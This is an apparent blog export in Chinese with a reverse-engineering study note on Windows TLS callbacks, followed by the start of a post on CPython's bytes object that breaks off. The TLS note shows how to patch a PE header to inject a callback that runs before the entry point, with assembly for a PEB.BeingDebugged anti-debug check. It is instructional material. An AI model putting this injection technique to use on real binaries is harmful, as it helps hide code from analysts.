<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆核系列No.18--TLS CallBackFunction</title>
      <link href="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/"/>
      <url>/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/</url>
      
        <content type="html"><![CDATA[<p>本节涉及PE头的相关知识，附上PE结构图：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/1.png" class=""><p>参考书《逆向工程核心原理》，示例程序亦出自书本内容。有时间精力的建议买来读读。</p><blockquote><p>TLS是个线程的独立数据存储空间，使用TLS技术==可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样==。</p></blockquote><p>示例程序：HelloTls.exe（32bit）</p><p>作用是简单弹框</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/2.png" class=""><p>OD载入程序，发现比EP代码执行更早的TLS代码：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/3.png" class=""><p>检测当前进程是否处于调试状态，是则弹窗显示‘‘Debugger Detected！’‘随后终止程序运行。</p><p>由此可见TLS技术在逆向工程中可用作一种反调试技术使用。</p><hr><br><h3 id="IMGAE-DATA-DURECTORY-9">IMGAE_DATA_DURECTORY[9]</h3><p>若在编程中启用了TLS功能，PE头文件中会设置TLS表项（IMAGE_NT_HEADERS -&gt; IMAGE_OPTIONAL_HEADER -&gt; IMAGE_DATA_DIRECTORY[9]）</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/4.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//结构体原型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY64</span> &#123;</span></span><br><span class="line">    ULONGLONG   StartAddressOfRawData;</span><br><span class="line">    ULONGLONG   EndAddressOfRawData;</span><br><span class="line">    PDWORD  AddressOfIndex;</span><br><span class="line">    PIMAGE_TLS_CALLBACK *AddressOfCallBacks;</span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY64;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span></span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    PDWORD  AddressOfIndex;</span><br><span class="line">    PIMAGE_TLS_CALLBACK *AddressOfCallBacks;</span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>示例程序为32bit，PEview下的TLS结构体信息：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/5.png" class=""><p>较为关键的是AddressOfCallbacks，其中记录着每个TLS函数的地址所构成的数组地址。这里是0x00408114（RVA）所在节区为.rdata，故转化后的RAW地址 = 0x6714，示例程序中只注册了一个TLS函数，0x00401000，可以通过修改PE文件头来增加TLS函数个数。</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/6.png" class=""><hr><h3 id="TLS-callback函数原型">TLS callback函数原型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span></span><br><span class="line">    <span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    PVOID DllHandle,<span class="comment">//模块句柄，标识唤醒该callback函数的单元</span></span></span><br><span class="line"><span class="params">    DWORD Reason,<span class="comment">//唤醒callback的原因，有四种</span></span></span><br><span class="line"><span class="params">    PVOID Reserved</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:left">Meaning</th></tr></thead><tbody><tr><td style="text-align:left">DLL_PROCESS_ATTACH1</td><td style="text-align:left">The DLL is being loaded into the virtual address space of the current process as a result of the process starting up or as a result of a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong>LoadLibrary</strong></a>. DLLs can use this opportunity to initialize any instance data or to use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-tlsalloc"><strong>TlsAlloc</strong></a> function to allocate a thread local storage (TLS) index. The <em>lpReserved</em> parameter indicates whether the DLL is being loaded statically or dynamically.</td></tr><tr><td style="text-align:left">DLL_PROCESS_DETACH0</td><td style="text-align:left">The DLL is being unloaded from the virtual address space of the calling process because it was loaded unsuccessfully or the reference count has reached zero (the processes has either terminated or called <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary"><strong>FreeLibrary</strong></a> one time for each time it called <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong>LoadLibrary</strong></a>). The <em>lpReserved</em> parameter indicates whether the DLL is being unloaded as a result of a <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary"><strong>FreeLibrary</strong></a> call, a failure to load, or process termination. The DLL can use this opportunity to call the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-tlsfree"><strong>TlsFree</strong></a> function to free any TLS indices allocated by using <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-tlsalloc"><strong>TlsAlloc</strong></a> and to free any thread local data. Note that the thread that receives the <strong>DLL_PROCESS_DETACH</strong> notification is not necessarily the same thread that received the <strong>DLL_PROCESS_ATTACH</strong>notification.</td></tr><tr><td style="text-align:left">DLL_THREAD_ATTACH  2</td><td style="text-align:left">The current process is creating a new thread. When this occurs, the system calls the entry-point function of all DLLs currently attached to the process. The call is made in the context of the new thread. DLLs can use this opportunity to initialize a TLS slot for the thread. A thread calling the DLL entry-point function with <strong>DLL_PROCESS_ATTACH</strong> does not call the DLL entry-point function with <strong>DLL_THREAD_ATTACH</strong>.  Note that a DLL’s entry-point function is called with this value only by threads created after the DLL is loaded by the process. When a DLL is loaded using <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong>LoadLibrary</strong></a>, existing threads do not call the entry-point function of the newly loaded DLL.</td></tr><tr><td style="text-align:left">DLL_THREAD_DETACH 3</td><td style="text-align:left">A thread is exiting cleanly. If the DLL has stored a pointer to allocated memory in a TLS slot, it should use this opportunity to free the memory. The system calls the entry-point function of all currently loaded DLLs with this value. The call is made in the context of the exiting thread.</td></tr></tbody></table><p>通过一个示例程序展示调用原因不同的TLS callback函数的调用顺序，TlsTest.exe（资料来源书中）</p><p>源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_console</span><span class="params">(<span class="type">char</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hStdout = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="comment">//之所以不使用printf输出是由于开启特定编译选项编译源程序时，先于诸线程调用执行的TSL回调函数中可能发生Run-Time Error</span></span><br><span class="line">    <span class="built_in">WriteConsoleA</span>(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> szMsg[<span class="number">80</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="built_in">wsprintfA</span>(szMsg, <span class="string">&quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);</span><br><span class="line">    <span class="built_in">print_console</span>(szMsg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> szMsg[<span class="number">80</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="built_in">wsprintfA</span>(szMsg, <span class="string">&quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);</span><br><span class="line">    <span class="built_in">print_console</span>(szMsg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">print_console</span>(<span class="string">&quot;ThreadProc() start\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_console</span>(<span class="string">&quot;ThreadProc() end\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_console</span>(<span class="string">&quot;main() start\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">60</span>*<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_console</span>(<span class="string">&quot;main() end\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故程序执行顺序如下：</p><ol><li>主线程开始运行，触发<strong>DLL_PROCESS_ATTACH</strong> 从而callback1、2函数被唤醒，进行内容输出</li><li>随后main函数内容开始执行，输出<code>main() start</code></li><li>main中调用CreateThread，触发DLL_THREAD_ATTACH  从而callback1、2函数被唤醒，进行内容输出（区别于之前的唤醒，这里的唤醒原因不同，第一个是1，这里是2（代号））</li><li>随后ThreadProc子线程执行本体内容，输出<code>ThreadProc() start\n ThreadProc() end\n</code>，</li><li>随后子线程return时，子线程消亡，触发DLL_THREAD_DETACH，代号3。callback1、2函数再次被唤醒</li><li>最后main再输出<code>main() end \n</code> 随后main进行return，触发DLL_PROCESS_DETACH 代号0，callback1、2函数再次被唤醒</li></ol><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/7.png" class=""><hr><h3 id="回调函数的调试">回调函数的调试</h3><p>以HelloTls.exe为例：alt + o，打开调试选项，设置OD加载程序的暂停位置为 system breakpoint</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/8.png" class=""><p>载入程序：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/9.png" class=""><p>在先前查看到的TLS回调函数的位置设置断点：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/10.png" class=""><p>执行程序，OD停在断点位置，就可以开始调试TLS函数了，对于多个TLS函数，可以分别查看，各自下断点：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/11.png" class=""><hr><h3 id="修改PE头添加TLS回调函数">修改PE头添加TLS回调函数</h3><ul><li>为写入代码与数据准备空间（需要挪移原TLS的内容）<ul><li>方案一：添加节区末尾的空白区域（由于节区对齐关系可能存在映射到内存中存在足够的空白空间供写入）</li><li>方案二：增加最后一个节区的大小（影响最后一个节区的节区头信息）</li><li>方案三：在最后添加新节区（影响NumberOfSection等PE字段）</li></ul></li></ul><p>采取方案二，先观察PE文件的对齐规则：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/12.png" class=""><p>在PE文件的最后位置，插入200byte内容（最小对齐FileAlignment的大小）</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/13.png" class=""><p>PE文件最后一个节区的节区头头信息：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/14.png" class=""><p>将该节区的SizeOfRawData扩容200字节，因此PointerToRawData为0x00009000，SizeOfRawData为400，是符合文件对齐规则的。节区.rsrc的VirtualSize = 0x1B4扩容后VirtualSize = 0x3B4 &lt; SectionAlignment（0x1000），故不需要对节区的VirtualSize做修改。</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/15.png" class=""><p>除了修改最后一个节区（.rsrc）的SizeOfRawData之外还需要修改该节区的Characteristic，往上附加写和执行的权限</p><table><thead><tr><th><strong>IMAGE_SCN_MEM_WRITE</strong>0x80000000</th><th>The section can be written to.</th></tr></thead><tbody><tr><td><strong>IMAGE_SCN_MEM_EXECUTE</strong>0x20000000</td><td>The section can be executed as code.</td></tr></tbody></table><p>修改后的characteristic为：0xE0000040</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/16.png" class=""><p>验证上述修改：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/17.png" class=""><p>扩展出来的空间的RAW = 0x9200 Size = 0x200， RVA = 0xC200</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/18.png" class=""><p>可以看出源程序时没有启用TLS机制的，故为空值（如果原来有数据，则复制一份到新开辟的空间中），这里写入TLS则需要进行设置，首先是TLS表的RAW = 0x9200 RVA = 0xC200， SIze则是写入的TLS结构体个数，这里写入一个则size = 0x18，这是由结构体IMAGE_TLS_DIRECTORY大小决定的，若原来就有数据，则size+18</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该结构体有x64版本，示例程序为32bit，占18字节空间</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_TLS_DIRECTORY32</span> &#123;</span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    PDWORD  AddressOfIndex;</span><br><span class="line">    PIMAGE_TLS_CALLBACK *AddressOfCallBacks;</span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure><p>修改IMAGE_OPTIONAL_HEADER -&gt; DATA_DIRECTOR[9]</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/19.png" class=""><p>验证修改：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/20.png" class=""><p>最后就是写入TLS的表项内容到开辟出来的空间了</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/21.png" class=""><p>AddressOfCallback = 0x0040C224（RVA） = 0x9224（RAW）对应写入的TLS函数地址构成的链表，以DWORD NULL结尾 0x0040C230，第一个TLS函数对应的RAW = 0x9230，这里是TLS函数的指令代码空间。C2 0C00 的指令码对应的汇编指令时<code>RETN 0C</code>命令，即不执行任何操作，直接返回。（PS：之所以不直接食用RETN是为了进行栈恢复，因为函数有三个参数，参考函数原型）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span></span><br><span class="line"><span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    PVOID DllHandle,</span></span><br><span class="line"><span class="params">    DWORD Reason,</span></span><br><span class="line"><span class="params">    PVOID Reserved</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure><p>发现上图HxD中的修改无法让程序正常运行，应该是结构体_IMAGE_TLS_DIRECTORY32某些字段没有设置好导致的，搜索下其他字段的含义以及应该写入的值，找到了：（图片来源在图片下方）</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/22.png" class=""><p>因此修改后：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/23.png" class=""><p>程序可正常运行，使用OD载入程序，并且在写入的TLS的位置设置断点：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/24.png" class=""><p>OD中运行程序，发现TLS函数被执行：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/25.png" class=""><p>验证成功后需要修改TLS函数的本体内容即可，这里执行的是RETN 0xC，并没有执行实质性操作。</p><p>分析调用TLS函数前在栈中的参数情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span></span><br><span class="line"><span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    PVOID DllHandle,</span></span><br><span class="line"><span class="params">    DWORD Reason,</span></span><br><span class="line"><span class="params">    PVOID Reserved</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure><p>用于判断TLS函数调用的理由是第二个参数，运行至此的 ss:[ebp+8]是第二个参数，<a href="https://blog.csdn.net/boildoctor/article/details/121206955">不清楚的推荐阅读</a></p><p>编辑TLS代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0040C230    837D 08 01      CMP DWORD PTR SS:[EBP+0x8], 0x1;获取TLS调用的Reason参数，是否由主线程加载唤醒</span><br><span class="line">0040C234    75 29           JNZ SHORT Hello_Ex.0040C25F;不是由主线程加载唤醒的则不作为进行return</span><br><span class="line">0040C236    64:A1 30000000  MOV EAX, DWORD PTR FS:[0x30];获取PEB信息</span><br><span class="line">0040C23C    8078 02 00      CMP BYTE PTR DS:[EAX+0x2], 0x0;判断是否处于被调试状态</span><br><span class="line">0040C240    74 1D           JE SHORT Hello_Ex.0040C25F;不是处于被调试状态则不做操作进行return</span><br><span class="line">0040C242    6A 00           PUSH 0x0;进入这里说明程序处于被调试状态，接下来操作则是进行弹窗的调用准备</span><br><span class="line">0040C244    68 70C24000     PUSH Hello_Ex.0040C270;入栈存放弹窗的标题字符串所在地址</span><br><span class="line">0040C249    68 80C24000     PUSH Hello_Ex.0040C280;入栈存放弹窗内容字符串所在地址</span><br><span class="line">0040C24E    6A 00           PUSH 0x0</span><br><span class="line">0040C250    FF15 E8804000   CALL DWORD PTR DS:[&lt;&amp;USER32.MessageB&gt;; user32.MessageBoxA</span><br><span class="line">0040C256    6A 01           PUSH 0x1</span><br><span class="line">0040C258    FF15 28804000   CALL DWORD PTR DS:[&lt;&amp;KERNEL32.ExitPr&gt;; kernel32.ExitProcess</span><br><span class="line">0040C25E    C2 0C00         RETN 0xC</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数原型：</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">MessageBoxA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HWND   hWnd,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpText,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">  [in]           UINT   uType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>保存汇编指令到可执行文件：Hello_Ex_modify.exe</p><p>汇编代码写出来了，接下来则是需要将几个提到的内容在16进制视图下写入：(注意字符串00结尾)</p><p>RVA  0x0040C270 -&gt;  RAW 0x9270，写入标题字符串：<code>Victory say：</code></p><p>RVA  0x0040C280 -&gt;  RAW 0x9280，写入标题字符串：<code>I found Debugger！</code></p><p>其他涉及的call API是通过IAT中获取的，若IAT中没有相应地API导入则会相对麻烦，例子中IAT是有对应的函数的，所以可以直接使用</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/26.png" class=""><p>OD查看字符串写入情况：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/27.png" class=""><p>查看汇编指令情况：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/28.png" class=""><p>设置断点，并运行，发现并未如愿：</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/29.png" class=""><p>发现读取参数的位置也不对，另外PEB记录的PEB.BeingDebugged的值为0（图中标错，应该往后一个字节的），本来是附加了调试器的，值应该为1的，感觉也不对。</p><p>期间也换了不同版本的OD，结果仍然一致，实验结果复刻不一致。</p><p>调试书的作者的版本依旧发现PEB.BeingDebugger的值依旧不正确，值表明程序并没有检测到由调试器的附加</p><img src="/2022/05/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-18-TLS-CallBackFunction/30.png" class=""><p>对于出现上述的状况是第三方OD相关插件自己做了规避，使用原版的OD即可正常查看字段</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python源码剖析No.6--bytes对象</title>
      <link href="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>不少编程语言中的<code>字符串</code>都是有<code>字符数组（又称字节序列）</code>来表示，比如C：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> msg[] = <span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure><p>由于<code>1 Byte</code> 占<code>8bit</code>空间，具有265种排列方式，因此单个字节的表现范围有限，对于英文字符以及常用的符号字符可能够，但为了兼容其他字符（伟大的汉字），计算机的先驱们发明了<code>多字节编码</code> – 通过多个字节来表示一个字符。</p><p>ps：这让我联想起python中实现大整数的方式了–串联多个C整型来表达。</p><p>Python提供的解决方案是<code>Unicode字符串（str）对象</code>，unicode 可以表示各种字符，无需关心编码。</p><p>然而，存储或者网络通讯时，字符串对象无法避免的需要<code>序列化</code>成字节序列进行传输。为此，python额外提供了<code>字节序列对象--bytes</code>。</p><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/1.png" class=""><p>简单理解就是和用户做交互的是str对象，是所容易理解的。而和机器做交互则是越简单越好，因此是序列化后的字位码</p><p>本节所探讨的是python中的<code>bytes对象</code></p><h3 id="bytes对象定义">bytes对象定义</h3><p>python中的bytes对象定义在/Objects/bytesobject.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 